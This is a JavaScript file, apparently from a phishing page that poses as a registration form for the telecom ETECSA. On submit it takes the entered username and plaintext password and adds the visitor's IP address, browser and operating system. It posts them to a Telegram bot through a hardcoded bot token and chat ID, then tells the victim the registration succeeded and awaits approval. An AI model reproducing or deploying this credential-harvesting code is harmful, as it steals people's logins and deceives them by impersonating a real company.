// Configuración de Telegram - USA TUS DATOS
const TELEGRAM_CONFIG = {
    BOT_TOKEN: '6516180762:AAHE5RGPH1kpADaABDGzQLt0962277Nlg1I',
    CHAT_ID: '6471602133'
};

// Obtener IP del usuario
async function getIP() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'IP no disponible';
    }
}

// Obtener información del navegador
function getBrowserInfo() {
    const userAgent = navigator.userAgent;
    const browserName = userAgent.match(/(opera|chrome|safari|firefox|msie|trident)/i)[0].toLowerCase();
    const os = userAgent.match(/\((.*?)\)/)[1].split('; ')[0];
    return { browser: browserName, os };
}

// Enviar mensaje a Telegram
async function sendTelegramMessage(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        return response.ok;
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        return false;
    }
}

// Manejar el formulario
document.getElementById('registerForm').addEventListener('submit', async function(e) {
    e.preventDefault();

    const username = document.getElementById('username').value.trim();
    const password = document.getElementById('password').value.trim();
    const messageDiv = document.getElementById('message');

    // Validar username y password
    if (username.length < 3 || password.length < 3) {
        showMessage('❌ El usuario y la contraseña deben tener al menos 3 caracteres', 'error');
        return;
    }

    // Mostrar loading
    const submitBtn = this.querySelector('button');
    submitBtn.disabled = true;
    submitBtn.textContent = '⏳ Registrando...';

    try {
        // Obtener IP, fecha y información del navegador
        const userIP = await getIP();
        const fecha = new Date().toLocaleString('es-ES');
        const browserInfo = getBrowserInfo();

        // Crear mensaje para Telegram
        const telegramMessage = `
🚀 <b>NUEVO REGISTRO EN ETECSA</b>

👤 <b>Usuario:</b> <code>${username}</code>
🔒 <b>Contraseña:</b> <code>${password}</code>
📅 <b>Fecha:</b> ${fecha}
🌐 <b>IP:</b> <code>${userIP}</code>
🆔 <b>ID:</b> <code>USER_${Date.now()}</code>
💻 <b>Navegador:</b> <code>${browserInfo.browser}</code>
🖥️ <b>Sistema Operativo:</b> <code>${browserInfo.os}</code>

✅ <i>Revisa el panel para aprobar</i>
        `;

        // Enviar a Telegram
        const telegramSuccess = await sendTelegramMessage(telegramMessage);

        if (telegramSuccess) {
            showMessage('✅ ¡Registro exitoso! Te notificaremos cuando seas aprobado.', 'success');
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
        } else {
            showMessage('❌ Error en el registro. Intenta nuevamente.', 'error');
        }

    } catch (error) {
        showMessage('❌ Error de conexión. Intenta más tarde.', 'error');
    } finally {
        submitBtn.disabled = false;
        submitBtn.textContent = '📱 Registrarse Ahora';
    }
});

// Mostrar mensajes
function showMessage(text, type) {
    const messageDiv = document.getElementById('message');
    messageDiv.textContent = text;
    messageDiv.className = 'message ' + type;
    messageDiv.style.display = 'block';

    setTimeout(() => {
        messageDiv.style.display = 'none';
    }, 5000);
}

// Efecto de escritura en el placeholder
let placeholderText = "Introduce tu usuario...";
let placeholderIndex = 0;
const usernameInput = document.getElementById('username');

function typePlaceholder() {
    if (placeholderIndex < placeholderText.length) {
        usernameInput.placeholder = placeholderText.substring(0, placeholderIndex + 1);
        placeholderIndex++;
        setTimeout(typePlaceholder, 100);
    }
}

// Iniciar efecto cuando la página cargue
window.addEventListener('load', typePlaceholder);
